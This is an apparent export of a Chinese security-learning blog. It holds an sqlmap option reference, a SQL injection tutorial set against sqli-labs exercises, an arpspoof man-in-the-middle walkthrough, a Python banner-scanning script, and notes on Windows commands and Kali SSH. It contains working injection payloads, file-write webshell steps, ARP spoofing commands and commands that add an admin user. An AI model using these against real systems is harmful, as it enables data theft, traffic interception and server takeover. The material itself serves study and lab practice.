--proxy-file 设置多条代理在文本中，可进行替换，快速完成切换 --ignore-proxy 忽略系统设置的代理服务器 设置tor隐藏网络–tor –tor-port –tor-type –check-tor 检查tor是否可用 1apt install tor #如果没有，需要安装 1service tor start 1sqlmap -u \"...\" -tor --tor-type https --check-tor 设置延迟某些服务器，会在你发包过快发出预警，或中断；默认是不设置延迟的。 –delay 0.5 设置延迟0.5秒 设置超时指定等待的秒数，默认是30秒 –timeout 10.5 10秒半 设置重试次数默认重试3次 –retries 4 设置随机化参数随即更改参数名称所对应的值，（sqlmap默认随机） –randomize 参数名称（特定） 1sqlmap -u \"...?id=1\" --randomize id --banner 设置日志过滤目标日志解析，并指定有效的Python正则表达式，用于过滤所需的日志 –scope 1sqlmap -l burp.log --scope=\"(www)?\\.target\\.(com|net|org)\" –skip-urlencode 不进行URL加密，有时中文或符号在服务端不遵循这种加密。 设置忽略401–ignore-401 用来忽略未验证错误 当你想测试偶尔返回401（未授权的）站点，，你想忽略他并在不提供验证的情况下继续测试 设置http协议私钥当web服务器需要适当地客户端证书和用于身份验证的私钥时，提供的值为pem格式的key-file，其中包含证书和私钥。 –auth-file 文件名 设置安全模式避免多次请求失败后销毁会话 可能发生在sqlmap的检测阶段会利用任何盲sql注入类型时，原因是sql有效负载不一定返回输出，因此可能会向应用程序会话管理或检查技术发出信号。 –safe-url –safe-post –safe-req –safe-freq 设置忽略URL编码–skip-urlencode 根据参数的位置（例如get）,默认情况下他的值可以是URL编码的。在某些情况下，后端web服务器不遵循RFC标准，需要以原始的非编码形式发送值。 性能优化设置-o 可以开启所有性能优化参数 设置持久http连接在HTTP报文中设置Connection：Keep-Alive。可避免服务器资源，性能受到影响 –keep-alive 设置不接受http bodysqlmap中检索没有body响应的内容 –unll-connection 设置多线程默认 1，为不影响服务器的性能和资源，sqlmap最大为 10 –threads 设置预测输出与–thread不兼容，在算法中用于检索值字符的顺序统计预测 –predict-output 指定位置注入注入介绍设置指定注入参数-p指定具体的探测参数（例 -p “id,uesr-agent”） –skip:忽略探测具体参数，例如 –level –skip “user-agent,referer” –level 1-5,5时忽略所有参数 –param-exclude：忽略包含具体内容的参数。例如：–param-exclude=”token|session” 不对包含token或session的参数进行探测 –skip-static：忽略非动态参数 设置任意注入位置例：参数：值* 注入参数强制设置DBMS默认会自动探测目标web应用程序的后端数据库管理系统 sqlmap完全支持的dbms种类：MySQL，oracle,Microsoft sql server,ibm db2,sqlite,firebird,sybase,sap maxdb,hsqldb,informix –dbms 数据库管理系统名称 [版本号] 例如：–dbms mysql [5.0] –dbms microsoft sql sever 05 强制设置OS指定默认自动识别探测目标web应用程序的后端操作系统（OS） sqlmap全支持的OS种类：Linux，Windows –os windows 或 –os linux 关闭负载转换机制–no-cast：防止NULL与字符串连接（dbms版本老旧），将null转换为空格 关闭字符转义机制–no-escape 字符转义机制:’f’ CHAR(102),混淆有效负载内容，防止后端服务器上查询转义机制（例如magic_quotes和/或 mysql_real_escape_string） 强制设置无效值替换要使原始参数值无效（例如id=12）时，经典的否定（例如id=-12） –invalid-bignum ：强制使用大整数（例如id=99999999） –invalid-logical ：强制使用布尔操作来实现相同的目标（例如id=12 and 18=19） –invalid-string ：强制使用随机字符串（例如id=adsfa） 自定义注入负载位置–prefix ：sql注入payload前缀 –suffix ：sql注入payload后缀 1sqlmap -u \"http://target.php?id=1\" -p id --prefix \"')\" --suffix \"and ('abc'=abc\" --dbs -v 5 设置tamper脚本–tamper 1sqlmap -u \"...\" --tamper \"between.py,randomcase.py\" -v 3 -v 3,5 查看http请求中的payload 存储脚本位置(usr/share/sqlmap/tamper) 设置dbms认证–dbms-cred=”root:toor” 自定义检测参数设置探测等级–level 1-5，默认1，探测复杂程度逐步提升 在xml/payload.xml 中指定了有效负载 设置风险参数–risk 1-3 ，默认1基本无害，2增加了基于时间的sql注入，3又增加了or的sql 注入 例如update，or 可能会打乱表单 设置页面比较参数–string 指定包含字符穿，查询为true –not-string 指定包含字符串，查询为false –regexp 指定通过正则表达式匹配字符串，查询为true –code 指定匹配http状态响应码，查询为true 设置内容比较参数–text-only 设置页面内容包含文本(–text-only=”welcome!”) –titles 设置title中包含文本，前提是知道如何区分查询的真假（–titles=”Login”） 注入技术参数设置具体sql注入技术默认 使用所有技术 –technique B:Boolean-based blind 基于布尔的盲注 E：Error-based 报错注入 U：Union query-based Union查询注入(union) S：Stacked queries 堆叠注入(;) T：Time-based blind 基于时间的盲注 Q：lnline queries 内联查询注入(and,or) 设置时间盲注延迟时间–time-sec 整数，默认为5秒 设置union字段数默认情况下 使用1-10列的union查询的sql注入技术，但是提高level值，可增加至50列 –union-cols 12-16 设置union字符–union-char 123 替换unll,可能会使探测成功 设置union查询表–union-from 表名(其他表有限制) 1sqlmap -u \"\" --technique U --union-from users --current-db -v3 设置DNS露出攻击针对目标网络可能对外流量进行限制，或者设置WAF。通过dns协议绕过限制，获取数据 –dns-domain “dns 服务器”（需要用户具有一个开放53端口的dns服务器），通过dns流量来获取数据 设置二次注入–second-order url(url为二次注入的响应页面） 识别指纹–fingerprint -f 检索DBMS信息检索dbms banner–banner -b 获取后端数据库banner信息 检索dbms当前用户–current-user 检索dbms当前数据库–current-db 获取当前数据库名 检索当前主机名–hostname 探测当前用户DBA–is-dba 探测当前用户是否是数据库管理员 枚举DBMS用户–users 获取dbms所有用户 枚举dbms用户密码–password 获取用户密码 枚举dbms权限–privileges –role(角色) 枚举信息列举数据库名-dbs 枚举数据库表–tables 枚举表名 -》指定具体数据库 -D 数据库名 1-D security --tables –exclude-sysdbs 获取除了系统数据库的表名 1--tables --exclude-sysdbs 枚举数据表列–columns -D指定数据库 -T指定数据表 枚举数据值–dump -D -T -C制定具体字段 枚举schema信息–schema –schema –ex clude-sysdbsg 只会检索和显示非系统数据库的模式的一部分 1sqlmap -u \"...\" --schema --threads 10 --batch 检索数据表数量–count -D 获取数据信息–start –stop 1--start 1 --stop 3 不包括第一页，123 1--stop 1 获取第一张表 –first –last 1--first 2 --last 5 从第二个出发到第五个字符 设置条件获取信息–pivot-column=id 设置独一无二的列，主键 –where=”id&gt;3” 设置条件 暴力破解数据使用场景：MySQL&lt;5.0时，MySQL中没有元数据库information_schema –common-tables 破解数据库名 –common-columus 破解表名 读取文件须有读取权限 –file-read 路径（绝对路径） 读取对应文件内容 写入文件须有写入权限 –file-write 写入本地文件(绝对路径) –file-dest 将读取的文件写入到远程绝对路径（结对路径） 检索所有信息-a -all 系统参数执行系统参数–os-shell （1）网站必须是root权限 （2）攻击者需要知道网站的绝对路径 （3）GPC为off，php主动转义的功能关闭 通用参数加载sqlite会话文件-s 加载http文本文件-t 将流量加载到文本文件当中 1sqlmap -u \"...\" -t /root/Desktop/target.txt --flush-session -v3 --batch 设置默认选择选项–batch 执行系统命令–os-cmd=”命令” 设置盲注字符集在基于时间，布尔盲注中，用户自定义字符集来加速数据检索过程 –charset=”123456789asdw” 爬取url爬取三层url 三层 在CSV输出中使用分割字符–csv-del=”;” 设置输出格式在将转储表数据存储到输出目录中的相应文件中时，sqlmap支持三种不同的格式：CSV，HTML和SQLITE。默认的是CSV –dump-format=”” 探测之前检测Internet连接检测当前计算机Internet连接是否正常（是否能连接sqlmap指定服务器上） –check-internet 解析和测试表单–form 估计时间–eta 刷新会话文件避免默认缓存机制 –flush-session 忽略会话中存储的结果保持会话文件不变 –fresh-queries 使用Hex函数检索数据 确保数据不会丢失，返回正确结果 –hex 自定义输出路径–output-dir=”” 响应页面解析错误–parse-errors 返回错误信息 –save=“路径” 保存为配置文件（-c） –update 更新 设置DBMS编码–encoding=”gbk” 存储http流量到HARHAR(http archive) 是一个用来储存http请求/响应信息的通用文件格式，基于JSON –har=”HARFILE” 筛选具体payload–test-filter=“ROW” 过滤具体payload–test-skip=”BENCHMARK” –scope=”regex” 针对proxy日志文件使用正则表达式筛选目标 参考链接 https://www.freebuf.com/sectool/164608.html","categories":[{"name":"工具","slug":"工具","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://lacc233.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"sql注入","slug":"sql注入","date":"2019-06-02T14:50:18.000Z","updated":"2020-06-09T23:07:41.319Z","comments":true,"path":"categories/web安全/sql注入/","link":"","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/","excerpt":"sql注入原理和sqli靶场","text":"sql注入原理和sqli靶场 介绍服务端的sql语句被恶意修改并成功执行的行为。 原理： 客户端向服务端发送数据，服务端未严格校验客户端发送数据（sql语言是解释型语言） 产生具体原因： 代码对sql语句的参数过滤不严格 未启用框架的安全配置，如php的gpc 未使用安全框架的查询方法，如对应开发语言的安全框架的查询接口 测试接口未删除 未启用防火墙 未启用其他安全防护设备 业务场景： 所有与数据库产生交互的地方都有可能 登录功能 搜索功能 详情页 商品购买 … 漏洞危害： 数据库信息泄露 网页篡改 网站被挂马，传播恶意软件 数据库被恶意操作 服务器被远程控制，被安装后门 不同人的看法： 研发人员：这不是bug,不要耽误我的开发进度 运维人员：研发怎么回事？ 产品经理：研发怎么回事？ 安全人员：这研发一点安全意识都没有 吃瓜群众：真香（看热闹），？？？说的啥 步骤： 判断是否有注入（是否严格校验）(1).可控参数改变能否影响页面显示(2).输入了sql语句是否能报错（报错可看到数据库的一些语句痕迹，不报错可判断我们的语句是否成功闭合） 什么类型的注入，盲注或报错注入 恶意语句进行查询 是否能成功执行 获取数据 数据库提权 万能密码登陆 ASP站点’or’=‘or’ 窃取哈希口令 读写文件 数据库备份文件 SQL数据库种类 Access 本地访问 MySQL 端口号：3306 mysql数据库库结构：默认mysql和infomation_schema数据库infomatino_schema内的schemata表存有所有库名；tables表中的所有表名；columns表内存有所有字段名。数据库-&gt;表-&gt;字段-&gt;值 information_schema数据库： 表名 作用 列名（字段名） 作用（存储字段值） schemata 存储的是用户创建所有数据库的库名 schemata_name 记录数据库库名的字段 default_character_set_name 数据存储格式 tables 所有表名 table_schema 存储所有数据库名 table_name 存储所有表名 columns 所有字段名 table_schema 存储所有数据库名 table_name 存储所有表名 column_name 存储所有字段名（列名） 查询全部列 select 列 from xxxx库.xxx表; 查询值 limit 注释符号：–空格，/ /内联注释，# ‘a’ ‘b’=‘ab’ 后使用 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1) 这种方式触发 sql 注入，受到 Mysql 版本的限制，其区间在 Mysql 5.1.5 - Mysql5.5 附近。 SQLSever 端口号：1433 注释符号：–，/ /注释 ‘a’+‘b’=‘ab’ Oracle 端口号：1521 注释符号：–，/ /注释 ‘a’||‘b’=‘ab’ PostgreSQL 端口号：5432或者5433 注释符号：–，/ /注释 ‘a’||‘b’=‘ab’ DB2 端口号：5000 SQLite 一种数据库文件，特别小，就一个库多个表，可用sqlite或者sqlite2打开 MongoDB 端口号：27017 sql攻击手段报错注入常用函数 concat() concat(1,2,3) 1,2,3紧挨着 concat_ws()concat_ws(“ “,1, 2,3) 1,2,3 用空格分隔 updatexml() updatexml(1,concat(0x7e,SUBSTR(database(),1,24),0x7e),1) 替换符合条件的文本 extractvalue() extractvalue(0x0a,concat(0x0a,(select database()))) 查找 limit limit 1,5 检索1后面五个，也就是2-6 盲注常用函数 length() length(“123456789”)=9 返回字符串长度，输出9 left() left(”123456789“,5) 提取字符串，从左开始，输出12345 substr() 与此相同的mid(),substring() substr(“123456789”, 5, 3) 提取子字符串，输出567 ascii() ascii(“s”) 返回特定字符的ASCII值 mysql读写文件：读： 前提：show global variables like “secure_file_priv”; 修改my.ini 重启phpstudy. select load_file(“f:\\1.txt”)； 1union select 1,load_file(f:www\\\\Less-7\\\\flag.txt),3 --+ 写： 前提：show variables like ‘%general%’; 查看其general_log 是否为 OFF。 若是，则修改为 on 。 1set global general_log &#x3D; on; 123union select 1,&#39;&lt;?php phpinfo();?&gt;&#39;,3 into outfile &quot;f:www\\\\Less-7\\\\1.php&quot; --+127.0.0.1\\Less-7\\1.php #查看是否写入成功 建议一句话 PHP 语句转换成十六进制 sqlmap: 1234sqlmap -hhsqlmap -u \"注入点\" --file-read \"文件路经\"4444 --file-write4444 --file-dest post 基于报错 get与post的区别:注入点发生改变，post 无法在浏览器中查看与修改，但是可以用插件。 burpsuite burpsuite 抓取http数据包保存在文件中 sqlmap 1sqlmap -r 文件路径 -p 指定探测参数 get报错注入(未完善)1select count(*) floor(rand(0)*2) 注解： 011011 post 基于时间和布尔值的盲注burpsuite抓取http报文 时间：… and (select (if (lenght (datebase() )&gt; 5,sleep(5),null))) –+ 布尔：… and (lenght (database() )&gt;5) –+ sqlmap 12时间 ： sqlmap -r \"文件路径\" -p 参数 --technique T 布尔： sqlmap -r \"文件路径\" -p 参数 --technique B http头中的注入在user-agent 和 referer 未被屏蔽时，可以进行注入 burpsuite user-agent: 1' and updatexml(1,concat(0x7e,version(),0x7e),1) or '1'='1 referer: 1' or (length(datebase())&gt;8) or if (1=1,sleep(5),null) or '1'='1 post_update语句的注入1updatexml(1,concat(0x7e,version(),0x7e),1) 注解： 1报错，执行”concat(0x7e,version(),0x7e)”做sql语句，替换报错内容，在报错中执行，最后输出。 updatexml和extractvalue函数 cookie注入例：less-20 burpsuite 抓取，用” \\ “判断闭合符号，之后 and 1=1,或 and \\ or 加sql语句 sqlmap 12345sqlmap.py -r \"target.txt\" --level 3 --batch sqlmap.py -r \"target.txt\" --level 3 --batch --dbssqlmap.py -r \"target.txt\" --level 3 --batch -D security --tablessqlmap.py -r \"target.txt\" --level 3 --batch -D security -T users --columns sqlmap.py -r \"target.txt\" --level 3 --batch -D security -T users -C password,username --dump base64注入burpsuite 首先截取，decoder 进行加密，例如：admin\\ base64加密后为：YWRtaW5c 进行报错。 sqlmap 1sqlmap.py -r \"target.txt\" --level 3 --batch --tamper base64encode.py 宽字节的注入原理： GBK ：宽字节字符集的一种，Mysql默认字符集, GBK占二字节，ASCII占一字节 php中编码为GBK，函数执行添加的是ASCII编码 %DF (常用)：会被php 中的addslashes 函数转义为” %DF\\‘ “ ， 如果网站，mysql编码都为GBK，那么就会被转义为”%DF%5C%27”，”%DF%5C”其为一个宽字符，也就是“縗”。 1http://127.0.0.1/sqli/Less-33/?id=-1%df%27%20union%20select%201,version(),database()--+ sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-33/?id=1%df%27\" --search --level 3 --risk 1 --thread 10 其实，首字节ascii大于128，如129十进制转十六进制为0x81,然后写%81即可； GBK 首字节对应(0x81-0xFE),尾字节对应 0x40-0xFE (0x7F除外)。 1http://127.0.0.1/sqli/Less-32/?id=-1%81%27%20%20union%20select%201,2,3--+ sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-32/?id=1\" --tamper=unmagicquotes.py Access偏移注入公式： 工具：owasp-zap access:小型数据库，只存在一个库，库内多个表。 SQL注入绕过大小写绕过 编码，关键字屏蔽，内联注释 pathinfo配合dnslog 原本是id=1 变成1.txt?id=1 绕过去除注释的sql注入注释符： –+ –空格 # /* 多行注释 */ preg_replace()函数来替换字符串或字符数组的莫些字符 例：less-23: 1?id=-1' union select 1,database(),'3 注解：-1使前面的失效，union select 语句有效，-1和3旁边的单引号为一对，自动补充的单引号会加在最后，最后完成闭合。 sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-23/?id=1\" --batch --dbs … 绕过去除and or 的sql注入preg_replace()函数来替换字符串或字符数组的莫些字符 双写，内含注释，符号 （例：oorr,an/**/d,&amp;&amp;,||) 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-25/?id=1\" --batch --dbs 绕过去除空格的sql注入%09 :Tab %0a ：换行 %20 ：空格 1http://127.0.0.1/sqli/Less-27/?id=100000000%27%09unIOn%09seLEct%091,version(),3%09||%09%271 sqlmap 1sqlmap.py -u \"http://127.0.0.1/sqli/Less-27/?id=1\" --batch --dbs sql漏洞修补 使用PDO进行加固 把查询语句弄成一个对象，通过函数判断输入进来的值是否为数字，然后再通过正则替换内容 使用参数化查询可有效避免SQL注入 使用strpos函数在GET输入做判断是否存在关键字 可以自定义关键字建立数组即可 1function foo($arg) &#123; #echo $arg; $array = array(\"and\", \"or\",\"xxx\"); for ($i=0; $i &lt; 2; $i++) &#123; if (strpos($arg,$array[$i])!== false)&#123; die(\"false\"); &#125; &#125; return $arg; &#125; 使用htmlspecialchars函数在GET输入做一个过滤 sql漏洞防御 数据库用户权限分明 代码层防御 常用过滤 str_replace()替换过滤 单引号（’） 双引号（”） 反斜杠（\\） NULL htmlspecialchars()函数 实体化过 滤 预定义的字符是： &amp; （和号）成为 &amp; “ （双引号）成为 “ ’ （单引号）成为 ’ &lt;&gt;成为 &lt;&gt; 就是把成变成一个纯字符(:з」∠) addslashes()函数 添加转义字符 会在以下关键词前面添加转义字符 单引号（’） 双引号（”） 反斜杠（\\） NULL 输入验证 编码输出 使用PDO预编译语句","categories":[{"name":"web安全","slug":"web安全","permalink":"https://lacc233.github.io/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://lacc233.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"更换Linux系统","slug":"更换Linux系统","date":"2019-05-03T10:23:15.000Z","updated":"2020-06-15T05:44:47.703Z","comments":true,"path":"categories/Linux/Kali-Linux/更换Linux系统/","link":"","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/%E6%9B%B4%E6%8D%A2Linux%E7%B3%BB%E7%BB%9F/","excerpt":"windows 系统更换 Linux（deepin 15.10）系统 ，所遇到的问题。","text":"windows 系统更换 Linux（deepin 15.10）系统 ，所遇到的问题。 更换为Linux系统遇到的问题问题1：无线网卡无法打开首先通过命令查看网卡 1rfkill list all 会显示出 ideapad* 的软件开，硬件关；所以我们关闭它，留下软硬件皆开的。 移出ideapad无线模块： 1sudo modprobe -r ideapad_laptop 写配置文件，开机关闭ideapad无线模块 1sudo touch /etc/modprobe.d/ideapad.conf 1sudo vim /etc/modprobe.d/ideapad.conf 写入 blacklist ideapad_laptop 如果信号易断，可下载安装无线网卡驱动，下命令可查看无线网卡型号 1lspci | grep Wireless 无线网卡驱动下载地址 1sudo make &amp; make install enjoy! 问题2：锁屏界面输入密码无法进入桌面原因是因为N卡，禁用即可转载 问题3：制作的启动盘，无法载入用这个制作做启动盘Win32DiskImager 网盘下载地址 问题4：分区新手建议全部给“/”，另外EFI是在UEFI模式下必须要有的分区，给个默认大小分区 建议你的系统盘之外的盘，采用ntfs文件系统格式系统盘ext4 enjoy!","categories":[{"name":"Linux","slug":"Linux","permalink":"https://lacc233.github.io/categories/Linux/"},{"name":"Kali Linux","slug":"Linux/Kali-Linux","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/"}],"tags":[]},{"title":"arpspoof工具","slug":"arpspoof工具","date":"2019-05-03T09:49:45.000Z","updated":"2020-05-10T11:27:26.618Z","comments":true,"path":"categories/工具/arpspoof工具/","link":"","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/arpspoof%E5%B7%A5%E5%85%B7/","excerpt":"Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通信，该工具通过替换传输中的数据从而达到对目标的欺骗引用","text":"Arpspoof是一个非常好的ARP欺骗的源代码程序。它的运行不会影响整个网络的通信，该工具通过替换传输中的数据从而达到对目标的欺骗引用 中间人流量劫持arp欺骗原理概述：被攻击者：192.168.13.150网关：192.168.13.2我：192.138.13.151arp在网络层，我先打开路由转发，然后进行arp广播，告诉被攻击者，我是网关，被攻击者的arp高速缓存表就会更新，认为我是网关；我告诉网关我是 被攻击者192.168.13.150,网关就会认为我是被攻击者192.168.13.150，最终达到流量劫持。 单向 流量：被攻击者-&gt;我-&gt;网关-&gt;被攻击者 欺骗被攻击主机，首先打开路由转发： 1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 执行命令，实现arp欺骗，让被攻击者（192.168.13.151）认为我是网关（192.168.13.2），流量劫持： 1arpspoof -i eth0 -t 192.168.13.151 192.168.13.2 最后用wireshark,对抓到的包分析。 双向 流量：被攻击者-&gt;我-&gt;网关-&gt;我-&gt;被攻击者 欺骗网关与被攻击主机 在单向的基础上，再对网关进行欺骗： 1arpspoof -i eth0 -t 192.168.13.2 192.168.13.151 欺骗被攻击主机，并作iptable nat转发 在单向的基础上，用iptables做NAT数据包转发 此处预留：iptables的链接 流量捕获与监视捕捉图片 1driftnet -i eth0","categories":[{"name":"工具","slug":"工具","permalink":"https://lacc233.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"获取banner脚本","slug":"获取banner脚本","date":"2019-05-03T09:46:55.000Z","updated":"2020-05-10T11:36:04.287Z","comments":true,"path":"categories/脚本/获取banner脚本/","link":"","permalink":"https://lacc233.github.io/categories/%E8%84%9A%E6%9C%AC/%E8%8E%B7%E5%8F%96banner%E8%84%9A%E6%9C%AC/","excerpt":"python脚本 banner：分析可知服务是否有漏洞","text":"python脚本 banner：分析可知服务是否有漏洞 脚本通过sys模块输入的脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#!/usr/bin/env python3#coding:utf-8import socketimport sysimport osfrom threading import Threadif len(sys.argv)!=2: print(\"参数个数不对\") print(\"例如：./getBanner.py ip.txt\") sys.exit()def getBanner(ip,port): socket.setdefaulttimeout(2) s=socket.socket() try: s.connect((ip,port)) banner=str(s.recv(1024)) s.close() return banner except: returndef checkVulns(ip,port): banner=getBanner(ip,port) if banner: if ('2.3.4' in banner): print(ip+\" vulnerable\") else: print(ip+\" unvulnerable\") else: print(ip+\" not get banner\")def main(): filename=str(sys.argv[1].strip()) if not os.path.exists(filename): print(\"指定的不出有你在，重输入\") sys.exit() port=22 filename=str(sys.argv[1].strip()) f=open(filename,\"r\") for i in f.readlines(): ip=i.strip(\"\\n\") t=Thread(target=checkVulns,args=(ip,port)) t.start() f.close()if __name__==\"__main__\": main() 通过os模块输入的脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#!/usr/bin/env python3#coding:utf-8import socketimport sysimport osfrom threading import Threadfrom optparse import OptionParserdef getBanner(ip,port): socket.setdefaulttimeout(2) s=socket.socket() try: s.connect((ip,port)) banner=str(s.recv(1024)) s.close() return banner except: returndef checkVulns(ip,port): banner=getBanner(ip,port) if banner: if ('2.3.4' in banner): print(ip+\" vulnerable\") else: print(ip+\" unvulnerable\") else: print(ip+\" not get banner\")def main(): usage=\"Usage: %prog -f &lt;filename&gt; -i &lt;ip address&gt;\" parser=OptionParser(usage=usage) parser.add_option(\"-f\",\"--filename\",type=\"string\",dest=\"filename\",help=\"ip address file\") parser.add_option(\"-i\",\"--ip\",type=\"string\",dest=\"address\",help=\"ip address\") (options,args)=parser.parse_args() filename=options.filename address=options.address if (filename==None and address==None): print(\"请指定文件地址或ip地址\") sys.exit() if(filename): if not os.path.exists(filename): print(\"指定的文件不在，重输入\") sys.exit() port=22 f=open(filename,\"r\") for i in f.readlines(): ip=i.strip(\"\\n\") t=Thread(target=checkVulns,args=(ip,port)) t.start() f.close() if(address): prefix=address.split(\".\")[0]+\".\"+address.split(\".\")[1]+\".\"+address.split(\".\")[2]+\".\" for i in range(1,255): ip=prefix+str(i) port=22 t=Thread(target=checkVulns,args=(ip,port)) t.start()if __name__==\"__main__\": main() 分步讲解引用模块socket12345import sockers=socket.socket()s.connect(\"192.168.0.12\",21)result=s.recv(1024)s.close() 添加选择1234if True: print(\"ok\")else: print(\"no\") False,0,空值等同；其余皆为True 添加异常处理1234try: f=open(\"ip.txt\",\"r\")except: pass w3c异常处理 菜鸟异常处理 添加函数12345678def getBanner(ip,port): ...def checkVulns(ip,port): ...def main(): ...if --name--==\"main\": main() –name– 判断是独立运行还是作为模块被导入 添加for循环12345for i in range(1,255): ip=\"192.168.0.\"+str(i)4for p in [21,22,80]: socket=ip+\":\"+str(p)44print(socket) print()自带换行 文件操作1234f=open(\"ip.txt\",\"r\")f.read()f.write()f.close() 模式 作用 r 读取 w 文件不存在则创建，存在则清空写入 a 追加 函数 作用 write() 写入，不会加”\\n” read() 读取 resdline() 按行读 resdlines() 一次读取一个列表 seck() 指针 close() 关闭并保存 导入模块import 模块名 from 模块名 import 函数名 引用sys模块1import sys sys.argv 变量： 专门用来向Python解释器传递参数 类似于shell脚本编程中的位置变量 sys.exit() 方法： 退出当前程序 引用os模块1import os os.path.isfile() 是否是文件 os.path.isdir() 是否是目录 os.path.exists() 是否存在 path：类，isfile(): 方法 多线程1234from threading import Threadt=Thread(target=要执行的函数，args=(响函数传递的的参数)) #args内的是元祖单个的为（a,）t.start() 进程是线程的容器，线程是操作系统调度分配处理器时间的基本单位 引用optparse模块设置选项 1234567from optparse import OptionParserusage=\"Usage: %prog -f &lt;filename&gt; -i &lt;address&gt;\"parser=OptionParser(usage=usage)parser.add_option(\"-f\",\"--file\",type=\"string\",dest=\"filename[传递的参数]\",help=\"[帮助提示信息]\")parser.add_option(\"-i\",\"--ip\",type=\"string\",dest=\"address[传递的参数]\",help=\"[帮助提示信息]\")(options,args)=parser.parse_args() -f,-i,-h","categories":[{"name":"脚本","slug":"脚本","permalink":"https://lacc233.github.io/categories/%E8%84%9A%E6%9C%AC/"}],"tags":[{"name":"python脚本","slug":"python脚本","permalink":"https://lacc233.github.io/tags/python%E8%84%9A%E6%9C%AC/"},{"name":"python","slug":"python","permalink":"https://lacc233.github.io/tags/python/"}]},{"title":"windows基础","slug":"windows基础","date":"2019-03-20T00:24:54.000Z","updated":"2020-05-31T10:19:15.538Z","comments":true,"path":"categories/Windows/windows基础/","link":"","permalink":"https://lacc233.github.io/categories/Windows/windows%E5%9F%BA%E7%A1%80/","excerpt":"win基础","text":"win基础 运行 命令 作用 dxdiag 诊断工具 msconfig 系统配置（启动） services.msc 服务 mstsc 远程桌面连接 gpedit.msc 本地组策略编辑器 regedit 注册表编辑器 ncpa.cpl 网络配置 notepad 记事本 control 控制面板 cmd shell calc 计算器 mmc 控制台 系统目录1.windows(系统安装目录)-&gt;System32(系统配置文件目录)-&gt;config-&gt;SAM (pe)2.Program Files/Program Files (x86) (程序默认安装目录)3.PerfLogs(日志)4.用户-&gt;启动 端口 服务 端口号 http 80,8080,8090,3128,8081,9080… ftp 21 telnet 23 tftp 69/udp ssh 22/tcp pop3 110/tcp tomcat 8080 win2003远程登录 3389 orical 1521 mysql mssql 1433/tcp,1433/udp qq 1080/udp 通过端口可以 信息搜集，目标探测，服务判断，系统判断，系统角色分析 密码爆破工具：U盘破解（sam）pe,lc5,彩虹表，hydra 快捷键win+e：计算机ctrl+shift+esc:任务管理器win+tab:3D桌面 手动清除木马开机启动项：% Run查询服务： services.msc网络端口： netstat -o (-anp) dos命令cmd: color a //cmd绿字黑底 1234ipconfig &#x2F;all ipconfig &#x2F;releaseipconfig &#x2F;renewsysteminfo 系统配置 (补丁) arp -a net view shutdown -s -t 180 -c “hack” shutdown -a cls //清屏 md seven //创建文件夹 rd seven //删除文件夹 copy con c:/seven.txt //创建文件 hello seven Ctrl+z type seven.txt //查看文件内容 start seven.txt //打开文件查看内容 start www.baidu.com //打开网页 del seven.txt //删除文件 tree //文件目录树形输出 copy 文件 位置例 copy 1.txt c:\\windows ren //重命名 net start //服务net stop telnetnet start telnet net usernet user hack 12314dsf /addnet user localgroup administrators hack /addnet user hack /delnet user guest /active:yesnet user guest 123345 net password 123456 //更改系统登录密码 net share //查看本地开启的共享net share k: ipc$net share ipc$ /delnet share c$ /del net use k: \\ip\\c$net use k: \\192.168.1.122\\c$ //拽共享盘 netstat /?schtasks /?","categories":[{"name":"Windows","slug":"Windows","permalink":"https://lacc233.github.io/categories/Windows/"}],"tags":[]},{"title":"kali ssh连接","slug":"kali ssh连接","date":"2019-03-20T00:09:39.000Z","updated":"2020-06-15T05:28:24.126Z","comments":true,"path":"categories/Linux/Kali-Linux/kali ssh连接/","link":"","permalink":"https://lacc233.github.io/categories/Linux/Kali-Linux/kali%20ssh%E8%BF%9E%E6%8E%A5/","excerpt":"SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。","text":"SSH 为 Secure Shell 的缩写，由 IETF 的网络小组（Network Working Group）所制定；SSH 为建立在应用层基础上的安全协议。SSH 是目前较可靠，专为远程登录会话和其他网络服务提供安全性的协议。利用 SSH 协议可以有效防止远程管理过程中的信息泄露问题。 ssh连接123vim /etc/ssh/sshd.conf #ssh配置文件PasswordAuthentication yes #允许密码链接PubkeyAuthentication yes #允许秘钥登录 12345/etc/init.d/ssh status #查看状态/etc/init.d/ssh start #开启ssh/etc/init.d/ssh restart #重启sshupdate-rc.d ssh enable #打开开机自启update-rc.d ssh disabled #关闭开机自启 服务器免密互联修改hosts 修改hostname 可以通过hostname登录 ssh-keygen 生成秘钥，上传秘钥 修改sshd.config,开启秘钥登录","categories":[{"name":"Linux","slug":"Linux","permalink":"https://lacc233.github.io/categories/Linux/"},{"name":"Kali 